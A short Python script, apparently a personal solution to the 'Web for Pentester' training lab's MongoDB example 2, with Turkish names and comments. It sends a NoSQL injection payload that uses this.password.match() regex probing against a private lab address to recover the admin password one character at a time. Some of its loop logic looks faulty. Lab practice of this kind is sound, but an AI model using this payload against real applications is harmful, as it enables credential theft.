# web for pentester mongodb exp 2 için
import requests
url = "http://192.168.126.130/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/{}/)%00"
uludagSoda = []
for i in range(0,128):
    character = "".join(chr(i))
    #print(character)
    varmi = url.format(character)
    istedigim = requests.get(varmi)
    if "admin" in istedigim.text:
        uludagSoda.append(character)
print(uludagSoda)
sonuc =""

uludagSoda = uludagSoda[:-1]
uludagSoda += "0"
son = len(uludagSoda)
while True:
    for z in range(0,len(uludagSoda)):
        print(z)
        for i in range(4,len(uludagSoda)):
            sonuc += uludagSoda[i]
            varmi = url.format(sonuc)
            istedigim = requests.get(varmi)
            if "admin" in istedigim.text:
                i -= 1
            else:
                sonuc = sonuc[:-1]
            print(i)
            print(sonuc)
        son -= 1
    print(sonuc)
    if son <= 0:
        break

#varmi = f"http://192.168.126.130/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/{character}/)%00"
#varmi = "http://192.168.126.130/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/{}/)%00".format(character)
# ?search=admin' %26%26 this.password.match(/./)%00
# http://192.168.126.130/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(/e/)%00
# link = "http://192.168.126.130/mongodb/example2/?search=admin%27%20%26%26%20this.password.match%28/"+str(c) + str("/)%00")

